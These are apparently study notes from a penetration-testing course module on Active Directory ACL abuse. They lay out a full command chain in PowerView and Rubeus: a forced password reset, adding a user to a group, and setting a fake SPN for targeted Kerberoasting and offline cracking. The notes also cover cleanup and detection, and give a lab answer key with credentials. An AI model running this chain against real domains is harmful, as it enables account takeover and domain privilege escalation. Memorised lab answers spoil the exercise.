# NOTE template — hands-on section (has commands)

---

## ID
534

## Module
Active Directory Enumeration & Attacks

## Kind
notes

## Title
Section 21 — ACL Abuse Tactics

## Description
Execute the full ACL abuse attack chain: ForceChangePassword → GenericWrite (group add) → GenericAll (fake SPN + targeted Kerberoasting) to compromise a user with DCSync rights, plus cleanup procedures and detection/remediation considerations.

## Tags
acl-abuse, forcechangepassword, genericwrite, genericall, targeted-kerberoasting, cleanup

## Commands
- $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
- $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\<USER>', $SecPassword)
- Set-DomainUserPassword -Identity <TARGET> -AccountPassword $NewPassword -Credential $Cred -Verbose
- Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>' -Credential $Cred -Verbose
- Set-DomainObject -Credential $Cred -Identity <TARGET> -SET @{serviceprincipalname='fake/SPN'} -Verbose
- .\Rubeus.exe kerberoast /user:<TARGET> /nowrap
- Set-DomainObject -Credential $Cred -Identity <TARGET> -Clear serviceprincipalname -Verbose
- Remove-DomainGroupMember -Identity '<GROUP>' -Members '<USER>' -Credential $Cred -Verbose

## What This Section Covers
The full exploitation of an ACL-based attack chain, starting from a user with ForceChangePassword rights, pivoting through GenericWrite to add to a group, leveraging nested group membership to gain GenericAll over a target user, setting a fake SPN for targeted Kerberoasting, and cracking the TGS ticket offline. Also covers mandatory cleanup steps and detection via Event ID 5136.

## When to Use ACL Abuse — Decision Framework

**Ask yourself these questions during an assessment:**

1. **Do I control a user but can't move laterally with their creds?** → Check their outbound ACL rights in BloodHound (Node Info → Outbound Control Rights → Transitive Object Control). If there are edges, you have an ACL chain.

2. **Have I hit a dead end with standard attacks (Kerberoasting, AS-REP, password spraying)?** → ACL abuse is often the "hidden path" that scanners miss. Run `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}` for every user you control.

3. **Is there a high-value target I can't directly compromise?** → Check if any user you control has GenericAll/GenericWrite/WriteDACL over that target. If GenericAll → set a fake SPN → targeted Kerberoast. If ForceChangePassword → reset their password (with client approval).

4. **Do I see group nesting in BloodHound?** → Groups nested inside other groups inherit all parent rights. Adding yourself to a low-privilege group can cascade into high-privilege access.

**Red flags to look for in BloodHound:**
- ForceChangePassword edges from Help Desk / IT users
- GenericAll/GenericWrite over user objects (especially service accounts)
- WriteDACL over the domain object (instant escalation to DCSync)
- Nested group chains that reach Domain Admins or DCSync-capable users
- Users with DS-Replication-Get-Changes + DS-Replication-Get-Changes-In-Filtered-Set (= DCSync)

## Methodology — Full Attack Chain
1. **ForceChangePassword:** Create PSCredential for your user → `Set-DomainUserPassword` to reset the target's password.
2. **GenericWrite (group add):** Auth as the newly compromised user → `Add-DomainGroupMember` to add yourself to the target group.
3. **Verify group nesting:** `Get-DomainGroup -Identity "<GROUP>" | select memberof` — confirm your group inherits into a privileged group.
4. **GenericAll (targeted Kerberoasting):** `Set-DomainObject -SET @{serviceprincipalname='fake/SPN'}` on the target user → `Rubeus.exe kerberoast /user:<TARGET> /nowrap` → crack with Hashcat mode 13100.
5. **Cleanup (IN THIS ORDER):** Remove fake SPN → Remove user from group → Reset password if possible. Order matters because removing from the group first kills your rights to clear the SPN.

## Multi-step Workflow
```
# === STEP 1: Auth as wley (ForceChangePassword holder) ===
Import-Module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# === STEP 2: Force change damundsen's password ===
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

# === STEP 3: Auth as damundsen (GenericWrite holder) ===
$SecPassword2 = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword2)

# === STEP 4: Add damundsen to Help Desk Level 1 → inherits into IT group ===
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

# === STEP 5: Set fake SPN on adunn (GenericAll via nested IT group) ===
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# === STEP 6: Kerberoast adunn ===
.\Rubeus.exe kerberoast /user:adunn /nowrap

# === STEP 7: Crack the hash ===
# hashcat -m 13100 adunn_tgs /usr/share/wordlists/rockyou.txt --force

# === CLEANUP (this order!) ===
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Set fake SPN on adunn, Kerberoast, and crack — what is the password? | `SyncMaster757` | Full ACL chain: wley → ForceChangePassword → damundsen → GenericWrite → Help Desk L1 → IT group → GenericAll → adunn → fake SPN → Rubeus kerberoast → Hashcat 13100 |

## Key Takeaways
- ACL abuse is a **chain**, not a single attack. Each hop requires re-authentication as the newly compromised user via PSCredential objects.
- Cleanup order matters: remove the SPN first, THEN remove the user from the group. Reversing this kills your permissions to clean up the SPN.
- Targeted Kerberoasting (GenericAll/GenericWrite → set SPN → roast) is the non-destructive alternative to password resets when you can't interrupt a service account.
- Group nesting is the silent multiplier — always check `memberof` on any group you can write to.
- These attacks generate Event ID 5136 (directory object modified) — detectable if Advanced Security Audit Policy is enabled.
- Always get client approval before destructive actions (password resets, group changes) and document everything for your report.
- If `Set-DomainObject` gives "Access denied" after adding to a group, try removing and re-adding the user — cached Kerberos tokens may not reflect new group membership immediately.

## Gotchas
- "Access is denied" on `Set-DomainObject` usually means group membership isn't being picked up yet. Remove and re-add the user to the group, or wait a few minutes for token refresh.
- "The principal already exists in the store" on `Add-DomainGroupMember` is harmless — it means the user is already in the group (your first call worked).
- If the lab is in a broken state from a previous user not cleaning up, reset the target in HTB and start from Step 1.
- `targetedKerberoast` from Linux can do the fake SPN → roast → cleanup in one command if you're attacking from a Linux host.
- ConvertFrom-SddlString can decode SDDL from Event ID 5136 logs to identify what ACL changes were made — useful for blue team awareness.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|ad-enum-attacks]]  
← [[20-acl-enumeration]] | [[22-dcsync]] →
<!-- AUTO-LINKS-END -->
